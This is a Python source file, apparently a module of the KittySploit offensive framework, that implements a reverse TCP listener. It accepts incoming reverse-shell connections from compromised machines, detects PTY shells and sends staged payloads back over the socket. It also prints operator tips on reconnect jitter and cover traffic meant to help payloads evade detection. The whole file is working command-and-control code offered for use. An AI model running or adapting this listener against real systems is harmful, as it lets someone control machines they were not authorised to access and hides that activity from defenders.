#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import socket

from lib.c2.tcp_resilience import sample_reconnect_delay


class Module(Listener):
    
    __info__ = {
        'name': 'Generic Reverse TCP Listener',
        'description': 'Ultra-simple reverse TCP listener - framework handles session management',
        'author': 'KittySploit Team',
        'handler': Handler.REVERSE,
        'session_type': SessionType.SHELL,
    }
    
    lhost = OptString("127.0.0.1", "Local IPv4 or IPv6 address", True)
    lport = OptPort(4444, "Local port", True)
    jitter_hint_percent = OptInteger(
        35,
        "Suggested payload reconnect jitter percent (operator guidance)",
        False,
        True,
    )
    reconnect_hint_seconds = OptInteger(
        15,
        "Suggested payload base reconnect interval seconds",
        False,
        True,
    )
    cover_traffic_hint = OptBool(
        True,
        "Print cover-traffic / jitter guidance for payload builders",
        False,
        True,
    )
    
    def run(self, background=False):
        """Run the reverse TCP listener - accepts multiple connections"""
        if background:
            return self.start()

        try:
            # Only initialize socket once if not already created
            if not hasattr(self, 'sock') or self.sock is None:
                print_status(f"Starting server on {self.lhost}:{self.lport}")
                print_status("Waiting connection...")
                print_status("Press Ctrl+C to stop the listener")
                
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.sock.settimeout(1.0)  # Set timeout for non-blocking behavior
                self.sock.bind((self.lhost, int(self.lport)))
                self.sock.listen(5)
                
                print_success(f"Listening on {self.lhost}:{self.lport}")
                if bool(self.cover_traffic_hint):
                    est = sample_reconnect_delay(
                        float(self.reconnect_hint_seconds or 15),
                        float(self.jitter_hint_percent or 35),
                    )
                    print_info(
                        f"Payload tip: set reconnect=true, jitter_percent={int(self.jitter_hint_percent or 35)}, "
                        f"reconnect_interval={int(self.reconnect_hint_seconds or 15)} "
                        f"(~{est:.1f}s sample delay). Optional cover_traffic on PowerShell/Python payloads."
                    )
            
            # Accept one connection and return it
            # The framework's _run_listener() will call this again for more connections
            try:
                # Accept connection
                client_socket, address = self.sock.accept()
                print_success(f"Connection received from {address[0]}:{address[1]}")

                pty_mode = bool(getattr(self, "session_pty_mode", False))
                if not pty_mode:
                    # Payloads with use_pty send KSPTY1 immediately; detect even when
                    # the exploit forgot to stamp session_pty_mode on the listener.
                    try:
                        from lib.shell.pty_runtime import PTY_MAGIC

                        old_to = client_socket.gettimeout()
                        client_socket.settimeout(0.75)
                        try:
                            peek = client_socket.recv(len(PTY_MAGIC), socket.MSG_PEEK)
                        finally:
                            try:
                                client_socket.settimeout(old_to)
                            except Exception:
                                pass
                        if peek and peek.startswith(PTY_MAGIC):
                            pty_mode = True
                            self.session_pty_mode = True
                    except Exception:
                        pass

                extra = {
                    "connection_type": "reverse",
                    "protocol": "tcp",
                }
                if pty_mode:
                    # PTY reverse shells must NOT use stager line framing — that
                    # path treats the KSPTY1 banner as whoami and then times out.
                    extra["pty_mode"] = True
                    extra["stager_line_mode"] = False
                else:
                    extra["stager_line_mode"] = True
                try:
                    from core.framework.stager_stage import pop_pending_stage, send_stage_over_socket

                    lhost_key = str(self.lhost or "")
                    lport_key = int(self.lport or 0)
                    stage = pop_pending_stage(lhost_key, lport_key)
                    if stage:
                        send_stage_over_socket(client_socket, stage)
                        print_success(f"Staged payload sent ({len(stage)} bytes)")
                        extra["staged"] = True
                except Exception as exc:
                    print_warning(f"Stage delivery skipped: {exc}")

                return (client_socket, address[0], address[1], extra)
                
            except socket.timeout:
                # Timeout occurred, return None to continue listening
                return None
            except KeyboardInterrupt:
                print_info("Interrupted by user")
                return False
            except Exception as e:
                if not self.stop_flag.is_set():
                    print_error(f"Error accepting connection: {e}")
                    # Return None to continue listening on non-fatal errors
                    return None
                else:
                    return False
                
        except KeyboardInterrupt:
            print_info("Interrupted by user")
            return False
        except OSError as e:
            print_error(f"Listener error: {e}")
            return False
    
    def shutdown(self):
        """Clean up connection"""
        try:
            if hasattr(self, 'sock') and self.sock:
                try:
                    self.sock.close()
                except OSError:
                    pass
                self.sock = None
        except OSError:
            pass
        self.running = False